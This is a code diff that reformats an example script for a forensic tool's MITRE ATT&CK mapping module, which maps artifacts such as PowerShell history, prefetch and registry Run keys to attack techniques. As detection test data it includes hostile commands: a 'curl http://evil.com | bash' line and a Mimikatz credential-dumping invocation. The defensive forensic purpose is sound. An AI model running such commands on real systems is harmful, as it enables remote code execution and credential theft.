@@ -4,7 +4,7 @@ MITRE ATT&CK Module Examples
 
 Demonstrates usage of the MITRE ATT&CK integration module.
 
-Author: Rivendell DFIR Suite
+Author: Rivendell DF Acceleration Suite
 Version: 2.1.0
 """
 
@@ -49,7 +49,7 @@ def example_2_simple_mapping():
 
     # Map PowerShell history artifact
     print("[*] Mapping PowerShell history artifact...")
-    techniques = mapper.map_artifact_to_techniques('powershell_history')
+    techniques = mapper.map_artifact_to_techniques("powershell_history")
 
     print(f"[+] Found {len(techniques)} technique(s):\n")
     for tech in techniques:
@@ -74,19 +74,18 @@ def example_3_context_aware_mapping():
     print(f"    {context}\n")
 
     techniques = mapper.map_artifact_to_techniques(
-        artifact_type='powershell_history',
-        context=context
+        artifact_type="powershell_history", context=context
     )
 
     print(f"[+] Detected {len(techniques)} technique(s):\n")
-    for tech in sorted(techniques, key=lambda x: x['confidence'], reverse=True):
+    for tech in sorted(techniques, key=lambda x: x["confidence"], reverse=True):
         print(f"  {tech['id']}: {tech['name']}")
         print(f"    Confidence: {tech['confidence']:.2f}")
         print(f"    Tactics: {', '.join(tech['tactics'])}")
 
         # Show why this was detected
-        factors = tech.get('confidence_factors', {})
-        if 'context' in factors and factors['context'] > 0:
+        factors = tech.get("confidence_factors", {})
+        if "context" in factors and factors["context"] > 0:
             print(f"    Context match: +{factors['context']:.2f}")
 
         print()
@@ -101,22 +100,17 @@ def example_4_data_aware_mapping():
     mapper = TechniqueMapper()
 
     # Map prefetch with known malicious tool
-    artifact_data = {
-        'filename': 'MIMIKATZ.EXE',
-        'run_count': 5,
-        'last_run': '2025-01-15T10:30:00Z'
-    }
+    artifact_data = {"filename": "MIMIKATZ.EXE", "run_count": 5, "last_run": "2025-01-15T10:30:00Z"}
 
     print(f"[*] Analyzing prefetch artifact:")
     print(f"    Filename: {artifact_data['filename']}\n")
 
     techniques = mapper.map_artifact_to_techniques(
-        artifact_type='prefetch',
-        artifact_data=artifact_data
+        artifact_type="prefetch", artifact_data=artifact_data
     )
 
     print(f"[+] Detected {len(techniques)} technique(s):\n")
-    for tech in sorted(techniques, key=lambda x: x['confidence'], reverse=True):
+    for tech in sorted(techniques, key=lambda x: x["confidence"], reverse=True):
         print(f"  {tech['id']}: {tech['name']}")
         print(f"    Confidence: {tech['confidence']:.2f}")
         print(f"    Tactics: {', '.join(tech['tactics'])}")
@@ -134,21 +128,18 @@ def example_5_batch_mapping():
     # Multiple artifacts from an investigation
     artifacts = [
         {
-            'type': 'powershell_history',
-            'context': 'Invoke-Mimikatz -Command "sekurlsa::logonpasswords"'
+            "type": "powershell_history",
+            "context": 'Invoke-Mimikatz -Command "sekurlsa::logonpasswords"',
+        },
+        {"type": "prefetch", "data": {"filename": "psexec.exe"}},
+        {
+            "type": "scheduled_tasks",
+            "data": {"task_name": "UpdateCheck", "action": "powershell.exe -enc ..."},
         },
         {
-            'type': 'prefetch',
-            'data': {'filename': 'psexec.exe'}
+            "type": "registry_run_keys",
+            "data": {"key": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"},
         },
-        {
-            'type': 'scheduled_tasks',
-            'data': {'task_name': 'UpdateCheck', 'action': 'powershell.exe -enc ...'}
-        },
-        {
-            'type': 'registry_run_keys',
-            'data': {'key': 'HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run'}
-        }
     ]
 
     all_techniques = {}
@@ -157,21 +148,26 @@ def example_5_batch_mapping():
 
     for artifact in artifacts:
         techniques = mapper.map_artifact_to_techniques(
-            artifact_type=artifact['type'],
-            artifact_data=artifact.get('data'),
-            context=artifact.get('context')
+            artifact_type=artifact["type"],
+            artifact_data=artifact.get("data"),
+            context=artifact.get("context"),
         )
 
         # Deduplicate and keep highest confidence
         for tech in techniques:
-            tech_id = tech['id']
-            if tech_id not in all_techniques or tech['confidence'] > all_techniques[tech_id]['confidence']:
+            tech_id = tech["id"]
+            if (
+                tech_id not in all_techniques
+                or tech["confidence"] > all_techniques[tech_id]["confidence"]
+            ):
                 all_techniques[tech_id] = tech
 
     print(f"[+] Total unique techniques detected: {len(all_techniques)}\n")
 
     # Show top 5 by confidence
-    top_techniques = sorted(all_techniques.values(), key=lambda x: x['confidence'], reverse=True)[:5]
+    top_techniques = sorted(all_techniques.values(), key=lambda x: x["confidence"], reverse=True)[
+        :5
+    ]
 
     print("Top 5 techniques by confidence:\n")
     for i, tech in enumerate(top_techniques, 1):
@@ -192,11 +188,11 @@ def example_6_generate_dashboards():
 
     # Map multiple artifacts
     artifacts = [
-        ('powershell_history', 'Invoke-Mimikatz'),
-        ('prefetch', None),
-        ('scheduled_tasks', None),
-        ('registry_run_keys', None),
-        ('bash_history', 'curl http://evil.com | bash'),
+        ("powershell_history", "Invoke-Mimikatz"),
+        ("prefetch", None),
+        ("scheduled_tasks", None),
+        ("registry_run_keys", None),
+        ("bash_history", "curl http://evil.com | bash"),
     ]
 
     all_techniques = []
@@ -208,28 +204,25 @@ def example_6_generate_dashboards():
         print(f"  {artifact_type}: {len(techniques)} technique(s)")
 
     # Generate dashboards
-    output_dir = '/tmp/rivendell_mitre_examples'
+    output_dir = "/tmp/rivendell_mitre_examples"
 
     print(f"\n[*] Generating dashboards in {output_dir}...\n")
 
-    result = generator.save_dashboards(
-        technique_mappings=all_techniques,
-        output_dir=output_dir
-    )
+    result = generator.save_dashboards(technique_mappings=all_techniques, output_dir=output_dir)
 
     print(f"[+] Dashboards generated:\n")
-    if 'splunk' in result:
+    if "splunk" in result:
         print(f"  Splunk XML: {result['splunk']}")
-    if 'elastic' in result:
+    if "elastic" in result:
         print(f"  Kibana JSON: {result['elastic']}")
-    if 'navigator' in result:
+    if "navigator" in result:
         print(f"  Navigator layer: {result['navigator']}")
-    if 'statistics' in result:
+    if "statistics" in result:
         print(f"  Statistics: {result['statistics']}")
 
     # Show coverage statistics
     coverage = generator._calculate_coverage(all_techniques)
-    stats = coverage['statistics']
+    stats = coverage["statistics"]
 
     print(f"\n[*] Coverage Statistics:\n")
     print(f"  Total techniques: {stats['total_techniques']}")
@@ -254,8 +247,8 @@ def example_7_get_technique_info():
         print("[-] No ATT&CK data available. Run update first.")
         return
 
-    technique_id = 'T1059.001'
-    technique = data['techniques'].get(technique_id)
+    technique_id = "T1059.001"
+    technique = data["techniques"].get(technique_id)
 
     if technique:
         print(f"[+] {technique['id']}: {technique['name']}\n")
@@ -282,21 +275,19 @@ def example_8_custom_mapping():
     print("[*] Adding custom mapping for 'custom_tool_log'...")
 
     mapper.add_custom_mapping(
-        artifact_type='custom_tool_log',
-        technique_id='T1059.001',  # PowerShell
-        confidence=0.85
+        artifact_type="custom_tool_log", technique_id="T1059.001", confidence=0.85  # PowerShell
     )
 
     mapper.add_custom_mapping(
-        artifact_type='custom_tool_log',
-        technique_id='T1105',  # Ingress Tool Transfer
-        confidence=0.75
+        artifact_type="custom_tool_log",
+        technique_id="T1105",  # Ingress Tool Transfer
+        confidence=0.75,
     )
 
     print("[+] Custom mappings added\n")
 
     # Now map the custom artifact
-    techniques = mapper.map_artifact_to_techniques('custom_tool_log')
+    techniques = mapper.map_artifact_to_techniques("custom_tool_log")
 
     print(f"[+] Custom artifact mapped to {len(techniques)} technique(s):\n")
     for tech in techniques:
@@ -340,5 +331,5 @@ def main():
     print()
 
 
-if __name__ == '__main__':
+if __name__ == "__main__":
     main()
